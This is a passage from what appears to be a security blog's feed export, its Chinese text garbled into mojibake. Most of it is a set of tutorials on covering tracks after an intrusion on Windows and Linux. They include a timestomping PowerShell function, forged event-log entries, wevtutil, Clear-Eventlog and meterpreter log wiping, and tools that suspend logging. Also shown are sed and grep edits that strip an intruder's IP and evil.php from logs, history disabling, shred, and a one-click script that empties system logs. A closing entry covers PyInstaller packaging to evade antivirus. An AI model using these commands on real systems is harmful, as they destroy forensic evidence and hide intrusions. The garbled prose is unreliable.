<p>ä¹Ÿå¯ä»¥ä½¿ç”¨udfå¤§é©¬</p>
]]></content>
      <categories>
        <category>ææƒ</category>
      </categories>
      <tags>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>ç—•è¿¹æ¸…ç†-Windowsç¯‡-01</title>
    <url>/posts/d8f69548/</url>
    <content><![CDATA[<h3 id="æ¸…ç†æ—¶é—´ç—•è¿¹"><a href="#æ¸…ç†æ—¶é—´ç—•è¿¹" class="headerlink" title="æ¸…ç†æ—¶é—´ç—•è¿¹"></a>æ¸…ç†æ—¶é—´ç—•è¿¹</h3><h4 id="ä¼ªé€ æ–‡ä»¶ä¿®æ”¹æ—¶é—´"><a href="#ä¼ªé€ æ–‡ä»¶ä¿®æ”¹æ—¶é—´" class="headerlink" title="ä¼ªé€ æ–‡ä»¶ä¿®æ”¹æ—¶é—´"></a>ä¼ªé€ æ–‡ä»¶ä¿®æ”¹æ—¶é—´</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">edit_time</span><span class="params">(<span class="variable">$path</span>)</span></span>&#123;<span class="variable">$date1</span> =<span class="built_in">Get-ChildItem</span> |</span><br><span class="line"><span class="built_in">Select</span> LastWriteTime|<span class="built_in">Get-Random</span>;<span class="variable">$date2</span> =<span class="built_in">Get-ChildItem</span> |</span><br><span class="line"><span class="built_in">Select</span> LastWriteTime|<span class="built_in">Get-Random</span>;<span class="variable">$date3</span> =<span class="built_in">Get-ChildItem</span> |</span><br><span class="line"><span class="built_in">Select</span> LastWriteTime|<span class="built_in">Get-Random</span>;<span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$path</span>).lastaccesstime=<span class="variable">$date1</span>.LastWriteTime;</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$path</span>).creationtime=<span class="variable">$date2</span>.LastWriteTime ;</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$path</span>).lastwritetime=<span class="variable">$date3</span>.LastWriteTime&#125;;</span><br><span class="line">edit_time(<span class="string">&quot;D:\test&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="ä¼ªé€ æ—¥å¿—æ—¶é—´"><a href="#ä¼ªé€ æ—¥å¿—æ—¶é—´" class="headerlink" title="ä¼ªé€ æ—¥å¿—æ—¶é—´"></a>ä¼ªé€ æ—¥å¿—æ—¶é—´</h4><p>ä½¿ç”¨eventcreate è¯¦è§ä¸‹ã€‚</p>
<h3 id="æ¸…ç†ç”¨æˆ·ç—•è¿¹"><a href="#æ¸…ç†ç”¨æˆ·ç—•è¿¹" class="headerlink" title="æ¸…ç†ç”¨æˆ·ç—•è¿¹"></a>æ¸…ç†ç”¨æˆ·ç—•è¿¹</h3><h4 id="æ¸…ç†3389ç—•è¿¹"><a href="#æ¸…ç†3389ç—•è¿¹" class="headerlink" title="æ¸…ç†3389ç—•è¿¹"></a>æ¸…ç†3389ç—•è¿¹</h4><h3 id="æ¸…ç†æ“ä½œç—•è¿¹"><a href="#æ¸…ç†æ“ä½œç—•è¿¹" class="headerlink" title="æ¸…ç†æ“ä½œç—•è¿¹"></a>æ¸…ç†æ“ä½œç—•è¿¹</h3><h4 id="æ—¥å¿—ç›¸å…³çŸ¥è¯†"><a href="#æ—¥å¿—ç›¸å…³çŸ¥è¯†" class="headerlink" title="æ—¥å¿—ç›¸å…³çŸ¥è¯†"></a>æ—¥å¿—ç›¸å…³çŸ¥è¯†</h4><h5 id="äº§ç”Ÿæµç¨‹"><a href="#äº§ç”Ÿæµç¨‹" class="headerlink" title="äº§ç”Ÿæµç¨‹"></a>äº§ç”Ÿæµç¨‹</h5><ul>
<li><code>svchost.exe</code>ï¼ˆsvchost.exeæœ‰äº›ä¸“é—¨è®°å½•ç”¨äºè®°å½•æ—¥å¿—çš„çº¿ç¨‹å¯åŠ¨æ—¥å¿—è®°å½•åŠŸèƒ½ï¼‰</li>
<li><code>å†…å­˜å †</code>ï¼ˆè®°å½•çš„æ“ä½œä¼šç¼“å­˜ä¸ºä¸€æ®µå†…å­˜å†…å®¹ï¼‰</li>
<li><code>wevtutil.exe</code>ï¼ˆå°†å†…å­˜å†…å®¹é€šè¿‡wevtutil.exeè§£æä¸ºxmlæ–‡æ¡£ï¼‰</li>
<li><code>æ—¥å¿—</code>ï¼ˆå°†xmlè½¬æ¢ä¸ºå¯è¯»çš„æ—¥å¿—ï¼‰</li>
</ul>
<h5 id="æ—¥å¿—ç±»å‹"><a href="#æ—¥å¿—ç±»å‹" class="headerlink" title="æ—¥å¿—ç±»å‹"></a>æ—¥å¿—ç±»å‹</h5><h6 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h6><p>ä½ç½® : <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></p>
<p>å®‰å…¨ç›¸å…³çš„äº‹ä»¶ï¼Œå¦‚ ç”¨æˆ·æƒé™å˜æ›´ç™»å½•ã€æ³¨é”€ï¼Œæ–‡ä»¶/æ–‡ä»¶å¤¹è®¿é—®</p>
<h6 id="System"><a href="#System" class="headerlink" title="System"></a>System</h6><p>ä½ç½®: <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p>
<p>ç³»ç»Ÿè¿›ç¨‹ã€è®¾å¤‡ã€ç£ç›˜æ´»åŠ¨ç­‰</p>
<h6 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h6><p>ä½ç½®: <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p>
<p>åŒ…å«æ“ä½œç³»ç»Ÿå®‰è£…çš„åº”ç”¨ç¨‹åºè½¯ä»¶ç›¸å…³çš„äº‹ä»¶</p>
<h6 id="åº”ç”¨ç¨‹åºåŠæœåŠ¡æ—¥å¿—"><a href="#åº”ç”¨ç¨‹åºåŠæœåŠ¡æ—¥å¿—" class="headerlink" title="åº”ç”¨ç¨‹åºåŠæœåŠ¡æ—¥å¿—"></a>åº”ç”¨ç¨‹åºåŠæœåŠ¡æ—¥å¿—</h6><p>è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯è¿æ¥ã€æ— çº¿ç½‘ç»œã€æœ‰çº¿ç½‘è·¯ã€è®¾å¤‡å®‰è£…ç­‰ç›¸å…³æ—¥å¿—ã€‚</p>
<h5 id="æŸ¥çœ‹æ—¥å¿—"><a href="#æŸ¥çœ‹æ—¥å¿—" class="headerlink" title="æŸ¥çœ‹æ—¥å¿—"></a>æŸ¥çœ‹æ—¥å¿—</h5><p><code>eventvwr</code></p>
<h5 id="ä¼ªé€ æ—¥å¿—"><a href="#ä¼ªé€ æ—¥å¿—" class="headerlink" title="ä¼ªé€ æ—¥å¿—"></a>ä¼ªé€ æ—¥å¿—</h5><p><code>eventcreate</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id 500</span><br><span class="line"></span><br><span class="line">-t  warning &#x2F; error &#x2F; information &#x2F; success</span><br><span class="line">-id  1-1000</span><br><span class="line">-so å¯ä»¥è‡ªå®šä¹‰  æ¥æº</span><br><span class="line">å…·ä½“è¯­æ³•å¦‚ä¸‹</span><br><span class="line">eventcreate [&#x2F;s Computer [&#x2F;u Domain\User [&#x2F;p Password]] &#123;[&#x2F;l &#123;APPLICATION|SYSTEM&#125;]|[&#x2F;so SrcName]&#125; &#x2F;t &#123;ERROR|WARNING|INFORMATION|SUCCESSAUDIT|FAILUREAUDIT&#125; &#x2F;id EventID &#x2F;d Description</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨</span><br><span class="line">eventcreate -l system(æ—¥å¿—ç±»å‹) -so administratorï¼ˆè°ç”Ÿæˆçš„ï¼‰ -t warningï¼ˆç­‰çº§ï¼‰ -d &quot;this is a test&quot;ï¼ˆæ—¥å¿—å†…å®¹ï¼‰ -id 500ï¼ˆidå·ï¼‰</span><br></pre></td></tr></table></figure>



<h4 id="æ—¥å¿—æ¸…ç†"><a href="#æ—¥å¿—æ¸…ç†" class="headerlink" title="æ—¥å¿—æ¸…ç†"></a>æ—¥å¿—æ¸…ç†</h4><ul>
<li>1.æŸ¥çœ‹äº‹ä»¶æŸ¥çœ‹å™¨â€”-æ‰‹åŠ¨æ¸…ç†</li>
<li>2.cmdå‘½ä»¤åˆ é™¤æ—¥å¿—</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wevtutil el åˆ—å‡ºç³»ç»Ÿä¸­æ‰€æœ‰æ—¥å¿—åç§°</span><br><span class="line">wevtutil cl system æ¸…ç†ç³»ç»Ÿæ—¥å¿—</span><br><span class="line">wevtutil cl application æ¸…ç†åº”ç”¨ç¨‹åºæ—¥å¿—</span><br><span class="line">wevtutil cl security æ¸…ç†å®‰å…¨æ—¥å¿—</span><br></pre></td></tr></table></figure>

<p>å‡¡æ˜¯æ“ä½œéƒ½ä¼šç•™ä¸‹ç—•è¿¹ï¼Œå“ªæ€•æ˜¯åˆ é™¤æ—¥å¿—ï¼Œä¹Ÿä¼šç•™ä¸‹ä¸€æ¡åˆ é™¤æ—¥å¿—çš„æ—¥å¿—</p>
<ul>
<li>3.powershellå‘½ä»¤åˆ é™¤</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PowerShell -Command &quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security&#125;&quot;</span><br><span class="line"></span><br><span class="line"># ä¸‹é¢è¿™ä¸ªåœ¨powershellä¸‹è¿è¡Œ éœ€è¦.netç‰ˆæœ¬3.5</span><br><span class="line">Get-WinEvent -ListLog Application,Setup,Security -Force | % &#123;Wevtutil.exe cl $_.Logname&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>4.msfåˆ é™¤æ—¥å¿—</li>
</ul>
<p><code>meterpreter &gt; clearev</code></p>
<ul>
<li>5.å•æ¡æ—¥å¿—çš„æ¸…ç†</li>
</ul>
<p>è§ä¸‹ç¯‡ï¼Œä¸»è¦å‚è€ƒä¸‰å¥½å­¦ç”Ÿå¤§ä½¬çš„æ–‡ç« [<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4]">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4]</a>~</p>
<h4 id="åœæ­¢è®°å½•æ—¥å¿—"><a href="#åœæ­¢è®°å½•æ—¥å¿—" class="headerlink" title="åœæ­¢è®°å½•æ—¥å¿—"></a>åœæ­¢è®°å½•æ—¥å¿—</h4><h5 id="åŸºäºpowershell"><a href="#åŸºäºpowershell" class="headerlink" title="åŸºäºpowershell"></a>åŸºäºpowershell</h5><p>é¡¹ç›®åœ°å€ <a href="https://github.com/hlldz/Phant0m">https://github.com/hlldz/Phant0m</a>  ä¼šç›´æ¥æ€æ‰çº¿ç¨‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#ä¿®æ”¹powershellæƒé™</span><br><span class="line">Get-ExecutionPolicy</span><br><span class="line">Set-ExecutionPolicy unrestricted</span><br><span class="line"></span><br><span class="line">Import-Module .\Invoke-Phant0m.ps1</span><br><span class="line">Invoke-Phant0m</span><br><span class="line">#æ•ˆæœä¸€èˆ¬</span><br></pre></td></tr></table></figure>



<h5 id="åŸºäºC"><a href="#åŸºäºC" class="headerlink" title="åŸºäºC"></a>åŸºäºC</h5><p>é¡¹ç›®åœ°å€ <a href="https://github.com/QAX-A-Team/EventCleaner">https://github.com/QAX-A-Team/EventCleaner</a> ç›¸æ¯”ä¸Šé¢ è¿™ä¸ªå¯ä»¥æš‚åœæ—¥å¿—è®°å½•çº¿ç¨‹ ä¹Ÿå¯ä»¥æ¢å¤çº¿ç¨‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#æš‚åœçº¿ç¨‹</span><br><span class="line">EventCleaner suspend</span><br><span class="line">#æ¢å¤çº¿ç¨‹</span><br><span class="line">EventCleaner normal</span><br></pre></td></tr></table></figure>







<h4 id="æ–‡ä»¶çš„è¦†å†™åˆ é™¤"><a href="#æ–‡ä»¶çš„è¦†å†™åˆ é™¤" class="headerlink" title="æ–‡ä»¶çš„è¦†å†™åˆ é™¤"></a>æ–‡ä»¶çš„è¦†å†™åˆ é™¤</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cipher &#x2F;W:D:\test 	</span><br><span class="line">#ä¼šå¯¹åˆ é™¤æ–‡ä»¶åç•™ä¸‹çš„ç©ºé—´è¿›è¡Œ3æ­¤è¦†ç›–æ“ä½œ å…ˆå†™å…¥0x00 å†å†™å…¥0xFF æœ€åå†™å…¥éšæ„æ•°å­—</span><br><span class="line"></span><br><span class="line">format G:&#x2F;Pï¼š4</span><br><span class="line">#å¯¹Gç›˜æ•°æ®è¿›è¡Œæ ¼å¼åŒ–å¤„ç†åè¿›è¡Œ4æ¬¡è¦†å†™</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>ç—•è¿¹æ¸…ç†</category>
      </categories>
      <tags>
        <tag>ç—•è¿¹æ¸…ç†</tag>
      </tags>
  </entry>
  <entry>
    <title>ç—•è¿¹æ¸…ç†-Linuxç¯‡</title>
    <url>/posts/1b08230/</url>
    <content><![CDATA[<h3 id="ç™»å½•ç—•è¿¹æ¸…ç†"><a href="#ç™»å½•ç—•è¿¹æ¸…ç†" class="headerlink" title="ç™»å½•ç—•è¿¹æ¸…ç†"></a>ç™»å½•ç—•è¿¹æ¸…ç†</h3><h4 id="åŸºæœ¬çš„æ—¥å¿—ç»“æ„"><a href="#åŸºæœ¬çš„æ—¥å¿—ç»“æ„" class="headerlink" title="åŸºæœ¬çš„æ—¥å¿—ç»“æ„"></a>åŸºæœ¬çš„æ—¥å¿—ç»“æ„</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;log&#x2F;btmp è®°å½•æ‰€æœ‰ç™»å½•å¤±è´¥ä¿¡æ¯ï¼Œä½¿ç”¨lastbå‘½ä»¤æŸ¥çœ‹</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;lastlog è®°å½•ç³»ç»Ÿä¸­æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´çš„æ—¥å¿—ï¼Œä½¿ç”¨lastlogå‘½ä»¤æŸ¥çœ‹</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;wtmp è®°å½•æ‰€æœ‰ç”¨æˆ·çš„ç™»å½•ã€æ³¨é”€ä¿¡æ¯ï¼Œä½¿ç”¨lastå‘½ä»¤æŸ¥çœ‹</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;utmp è®°å½•å½“å‰å·²ç»ç™»å½•çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä½¿ç”¨w,who,usersç­‰å‘½ä»¤æŸ¥çœ‹</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;secure è®°å½•ä¸å®‰å…¨ç›¸å…³çš„æ—¥å¿—ä¿¡æ¯</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;message è®°å½•ç³»ç»Ÿå¯åŠ¨åçš„ä¿¡æ¯å’Œé”™è¯¯æ—¥å¿—</span><br></pre></td></tr></table></figure>

<h4 id="æ¸…é™¤æ—¥å¿—"><a href="#æ¸…é™¤æ—¥å¿—" class="headerlink" title="æ¸…é™¤æ—¥å¿—"></a>æ¸…é™¤æ—¥å¿—</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># lastb</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;btmp</span><br><span class="line"># last</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;wtmp</span><br><span class="line"># æ¸…é™¤ç”¨æˆ·æœ€åä¸€æ¬¡ç™»å½•æ—¶é—´</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;lastlog </span><br><span class="line"># æ¸…é™¤å®‰å…¨æ—¥å¿—è®°å½•</span><br><span class="line">cat &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"># æ¸…é™¤ç³»ç»Ÿæ—¥å¿—è®°å½•</span><br><span class="line">cat &#x2F;dev&#x2F;null &gt; &#x2F;var&#x2F;log&#x2F;secure</span><br><span class="line"># æ¸…é™¤å½“å‰ç™»å½•ç”¨æˆ·çš„ä¿¡æ¯</span><br><span class="line">echo &gt; &#x2F;var&#x2F;log&#x2F;utmp </span><br></pre></td></tr></table></figure>

<h4 id="åˆ é™¤æ‰€æœ‰åŒ¹é…åˆ°å­—ç¬¦ä¸²çš„è¡Œ-æ¯”å¦‚ä»¥å½“å¤©æ—¥æœŸæˆ–è€…è‡ªå·±çš„ç™»å½•ip"><a href="#åˆ é™¤æ‰€æœ‰åŒ¹é…åˆ°å­—ç¬¦ä¸²çš„è¡Œ-æ¯”å¦‚ä»¥å½“å¤©æ—¥æœŸæˆ–è€…è‡ªå·±çš„ç™»å½•ip" class="headerlink" title="åˆ é™¤æ‰€æœ‰åŒ¹é…åˆ°å­—ç¬¦ä¸²çš„è¡Œ,æ¯”å¦‚ä»¥å½“å¤©æ—¥æœŸæˆ–è€…è‡ªå·±çš„ç™»å½•ip"></a>åˆ é™¤æ‰€æœ‰åŒ¹é…åˆ°å­—ç¬¦ä¸²çš„è¡Œ,æ¯”å¦‚ä»¥å½“å¤©æ—¥æœŸæˆ–è€…è‡ªå·±çš„ç™»å½•ip</h4><p><code>sed -i &#39;/è‡ªå·±çš„ip/&#39;d /var/log/messages</code></p>
<h4 id="å…¨å±€æ›¿æ¢è‡ªå·±ip"><a href="#å…¨å±€æ›¿æ¢è‡ªå·±ip" class="headerlink" title="å…¨å±€æ›¿æ¢è‡ªå·±ip"></a>å…¨å±€æ›¿æ¢è‡ªå·±ip</h4><p><code>sed -i &#39;s/192.168.166.85/192.168.1.1/g&#39; secure</code></p>
<p>å‰é¢æ˜¯å¾…æ›¿æ¢ip åé¢ä¸ºæ›¿æ¢åçš„ip</p>
<h3 id="æ—¶é—´ç—•è¿¹æ¸…ç†"><a href="#æ—¶é—´ç—•è¿¹æ¸…ç†" class="headerlink" title="æ—¶é—´ç—•è¿¹æ¸…ç†"></a>æ—¶é—´ç—•è¿¹æ¸…ç†</h3><p><code>ls -al</code> å¯ä»¥æŸ¥çœ‹åˆ›å»ºæ—¶é—´</p>
<h4 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch -r ç›®æ ‡æ—¶é—´çš„æ–‡ä»¶ éœ€è¦ä¿®æ”¹æ—¶é—´çš„æ–‡ä»¶</span><br><span class="line">touch -d &quot;2018-04-18 08:00:00&quot; Th1s_isnot_flag.txt</span><br><span class="line">-a ï¼š ä»…ä¿®æ”¹access time</span><br><span class="line">-c ï¼šä»…ä¿®æ”¹æ—¶é—´ï¼Œè€Œä¸å»ºç«‹æ–‡ä»¶</span><br><span class="line">-d ï¼šåé¢å¯ä»¥æ¥æ—¥æœŸï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ --date&#x3D;&quot;æ—¥æœŸæˆ–æ—¶é—´&quot;</span><br><span class="line">-m ï¼šä»…ä¿®æ”¹mtime</span><br><span class="line">-t ï¼šåé¢å¯ä»¥æ¥æ—¶é—´ï¼Œæ ¼å¼ä¸º [YYMMDDhhmm]</span><br></pre></td></tr></table></figure>

<h4 id="date"><a href="#date" class="headerlink" title="date"></a>date</h4><p><code>date -s 20140712 18:30:50</code> å°†å½“å‰ç³»ç»Ÿæ—¥æœŸä¿®æ”¹ä¸º2014å¹´07æœˆ12 18:30:50</p>
<h4 id="hwclock"><a href="#hwclock" class="headerlink" title="hwclock"></a>hwclock</h4><p><code>hwclock --hctosys</code>  # â€“hctosys å°†ç³»ç»Ÿæ—¶é’Ÿè°ƒæ•´ä¸ºä¸ç›®å‰çš„ç¡¬ä»¶æ—¶é’Ÿä¸€è‡´ã€‚</p>
<h3 id="æ“ä½œç—•è¿¹æ¸…ç†"><a href="#æ“ä½œç—•è¿¹æ¸…ç†" class="headerlink" title="æ“ä½œç—•è¿¹æ¸…ç†"></a>æ“ä½œç—•è¿¹æ¸…ç†</h3><h4 id="æœåŠ¡æ—¥å¿—ä¿®æ”¹"><a href="#æœåŠ¡æ—¥å¿—ä¿®æ”¹" class="headerlink" title="æœåŠ¡æ—¥å¿—ä¿®æ”¹"></a>æœåŠ¡æ—¥å¿—ä¿®æ”¹</h4><p># ä½¿ç”¨grep -væ¥æŠŠæˆ‘ä»¬çš„ç›¸å…³ä¿¡æ¯åˆ é™¤,</p>
<p><code>cat /var/log/nginx/access.log | grep -v evil.php &gt; tmp.log</code></p>
<p># æŠŠä¿®æ”¹è¿‡çš„æ—¥å¿—è¦†ç›–åˆ°åŸæ—¥å¿—æ–‡ä»¶</p>
<p><code>cat tmp.log &gt; /var/log/nginx/access.log/</code> </p>
<h4 id="historyè®°å½•æ¸…ç†"><a href="#historyè®°å½•æ¸…ç†" class="headerlink" title="historyè®°å½•æ¸…ç†"></a>historyè®°å½•æ¸…ç†</h4><ul>
<li>ç™»å½•sshåä¸è®°å½•history</li>
</ul>
<p><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;export HISTSIZE=0; export HISTFILESIZE=0</code></p>
<ul>
<li>æ¸…ç† <code>~/.bash_history</code></li>
<li><code>history -c </code></li>
<li><code>vim /etc/profile</code> ä¿®æ”¹ <code>HISTSIZE=0</code></li>
</ul>
<h4 id="æ–‡ä»¶è¦†å†™"><a href="#æ–‡ä»¶è¦†å†™" class="headerlink" title="æ–‡ä»¶è¦†å†™"></a>æ–‡ä»¶è¦†å†™</h4><ul>
<li>å•æ–‡ä»¶</li>
</ul>
<p><code>shred -f -u -z -v -n 8 1.txt</code></p>
<ul>
<li>æ–‡ä»¶å¤¹</li>
</ul>
<p><code>wipe -r</code></p>
<h3 id="éšè—sshç™»å½•è®°å½•"><a href="#éšè—sshç™»å½•è®°å½•" class="headerlink" title="éšè—sshç™»å½•è®°å½•"></a>éšè—sshç™»å½•è®°å½•</h3><p><code>ssh -T root@192.168.0.1 /bin/bash -i</code></p>
<p><code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash â€“i</code></p>
<p><code>-o UserKnownHostsFile=/dev/null</code> #è¿™ä¸ªæ˜¯knowhostçš„ä¿¡æ¯åŠå…¬é’¥</p>
<p><code>-T user@host /bin/bash â€“i</code> #ä¸åˆ†é…ä¼ªç»ˆç«¯ä½†æ˜¯ç»™ä¸ªbashçš„ç»ˆç«¯</p>
<h3 id="ä¸€é”®æ¸…é™¤è„šæœ¬"><a href="#ä¸€é”®æ¸…é™¤è„šæœ¬" class="headerlink" title="ä¸€é”®æ¸…é™¤è„šæœ¬"></a>ä¸€é”®æ¸…é™¤è„šæœ¬</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/bash</span></span><br><span class="line">echo &gt; /var/log/syslog</span><br><span class="line">echo &gt; /var/log/messages</span><br><span class="line">echo &gt; /var/log/httpd/access_log</span><br><span class="line">echo &gt; /var/log/httpd/error_log</span><br><span class="line">echo &gt; /var/log/xferlog</span><br><span class="line">echo &gt; /var/log/secure</span><br><span class="line">echo &gt; /var/log/auth.log</span><br><span class="line">echo &gt; /var/log/user.log</span><br><span class="line">echo &gt; /var/log/wtmp</span><br><span class="line">echo &gt; /var/log/lastlog</span><br><span class="line">echo &gt; /var/log/btmp</span><br><span class="line">echo &gt; /var/run/utmp</span><br><span class="line">rm ~/./bash_history</span><br><span class="line">history -c</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ç—•è¿¹æ¸…ç†</category>
      </categories>
      <tags>
        <tag>ç—•è¿¹æ¸…ç†</tag>
      </tags>
  </entry>
  <entry>
    <title>python_pycåç¼–è¯‘</title>
    <url>/posts/76fcd9b1/</url>
    <content><![CDATA[<p><a href="https://mp.weixin.qq.com/s/7ggXt0TkEuN2SabVin5oLA">https://mp.weixin.qq.com/s/7ggXt0TkEuN2SabVin5oLA</a></p>
<p>python  pyinstaller æ‰“åŒ…exeå…æ€</p>
<h3 id="pyinstaller"><a href="#pyinstaller" class="headerlink" title="pyinstaller"></a>pyinstaller</h3><p><code>https://www.virustotal.com/gui/file/8bc40da35383f54998be34e32c0ff22e25dd9c4c8f5df1c10e6f0bb9e431c8b0?nocache=1</code>    3/69</p>
<h3 id="py2exe"><a href="#py2exe" class="headerlink" title="py2exe"></a>py2exe</h3><p>ä½¿ç”¨py2exe æ‰“åŒ…å®Œæ–‡ä»¶å ä¼šç”Ÿæˆå¤šä¸ªæ–‡ä»¶ äºŒ pyinstaller ä¼šç”Ÿäº§ä¸€ä¸ªexe</p>
<p><code>https://www.virustotal.com/gui/file/823d00a6d1ab82bbfaa5e997d5192b72cca7dba0e9b2d18d69ecf15e75fff9e7?nocache=1</code>  5/69</p>
<h3 id="åç¼–è¯‘pyinstalleræ‰“åŒ…çš„exeæ–‡ä»¶"><a href="#åç¼–è¯‘pyinstalleræ‰“åŒ…çš„exeæ–‡ä»¶" class="headerlink" title="åç¼–è¯‘pyinstalleræ‰“åŒ…çš„exeæ–‡ä»¶"></a>åç¼–è¯‘pyinstalleræ‰“åŒ…çš„exeæ–‡ä»¶</h3><p><a href="https://github.com/countercept/Python-exe-unpacker">https://github.com/countercept/Python-exe-unpacker</a></p>
<p>pyinstalleråœ¨æ‰“åŒ…pycæ—¶ï¼Œä¼šå»æ‰pycçš„<code>magic</code>å’Œ<code>æ—¶é—´æˆ³</code>ã€‚éœ€è¦è¿›è¡Œæ‰‹å·¥ä¿®å¤ã€‚pyinstalleråœ¨æ‰“åŒ…çš„ç³»ç»Ÿåº“çš„æ—¶å€™æ˜¯ä¸ä¼šå»æ‰magicçš„ï¼Œæ‰€ä»¥æŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿåº“çš„magicå³å¯</p>
<p>åœ¨å°†exe è½¬æ¢ä¸ºpycæ–‡ä»¶æœ‰ä¸¤ç§æ–¹æ³• å¦‚ä¸‹</p>
<h4 id="å°†-exe-æ–‡ä»¶è½¬æ¢ä¸º-pyc-æ–‡ä»¶"><a href="#å°†-exe-æ–‡ä»¶è½¬æ¢ä¸º-pyc-æ–‡ä»¶" class="headerlink" title="å°† exe æ–‡ä»¶è½¬æ¢ä¸º pyc æ–‡ä»¶"></a>å°† exe æ–‡ä»¶è½¬æ¢ä¸º pyc æ–‡ä»¶</h4><h5 id="ä½¿ç”¨-pyinstxtractor-py"><a href="#ä½¿ç”¨-pyinstxtractor-py" class="headerlink" title="ä½¿ç”¨ pyinstxtractor.py"></a>ä½¿ç”¨ pyinstxtractor.py</h5><p><a href="https://sourceforge.net/projects/pyinstallerextractor/">https://sourceforge.net/projects/pyinstallerextractor/</a></p>
<p>å°†exe å’Œ pyinstxtractor.py æ”¾åœ¨åŒä¸€ç›®å½•ä¸‹</p>
<p><code>python pyinstxtractor.py test.exe</code></p>
<p>ç„¶åä¼šç”Ÿæˆ</p>
<p><img src="/posts/76fcd9b1/1.PNG" alt="æˆªå›¾"></p>
<br>

<h5 id="ä½¿ç”¨pyi-archive-viewer"><a href="#ä½¿ç”¨pyi-archive-viewer" class="headerlink" title="ä½¿ç”¨pyi-archive_viewer"></a>ä½¿ç”¨pyi-archive_viewer</h5><p>äºŒæ˜¯ä½¿ç”¨pyi-archive_viewerå‘½ä»¤ï¼ˆéœ€è¦å®‰è£…pyinstallerï¼‰</p>
<p><code>pyi-archive_viewer test.exe</code></p>
<p><img src="/posts/76fcd9b1/pyi-archive_viewer1.PNG" alt="æˆªå›¾"></p>
<p><img src="/posts/76fcd9b1/pyi-archive_viewer2.PNG" alt="æˆªå›¾"></p>
<p>è¿™æ ·ä¼šç”Ÿæˆä¸€ä¸ªtest2.pycæ–‡ä»¶ ç„¶åæ¢å¤è¢«pyinstaller æ‰“åŒ…ååˆ é™¤çš„å­—èŠ‚</p>
<h4 id="ä¿®å¤pyc-æ–‡ä»¶"><a href="#ä¿®å¤pyc-æ–‡ä»¶" class="headerlink" title="ä¿®å¤pyc æ–‡ä»¶"></a>ä¿®å¤pyc æ–‡ä»¶</h4><p>åœ¨<code>test.exe_extracted</code>æ–‡ä»¶ä¸‹ å­˜åœ¨struct å’Œ test ä¸¤æ–‡ä»¶<br><img src="/posts/76fcd9b1/3.PNG" alt="æˆªå›¾"></p>
<p>ä½¿ç”¨010editoræ‰“å¼€ å°†structçš„ç¬¬ä¸€è¡Œæ’å…¥åˆ°testçš„ç¬¬ä¸€è¡Œ<br><img src="/posts/76fcd9b1/4.PNG" alt="æˆªå›¾"><br><img src="/posts/76fcd9b1/5.PNG" alt="æˆªå›¾"></p>
<p>æ·»åŠ å<br><img src="/posts/76fcd9b1/6.PNG" alt="æˆªå›¾"><br> å¦å­˜ä¸ºtest.pycå³å¯</p>
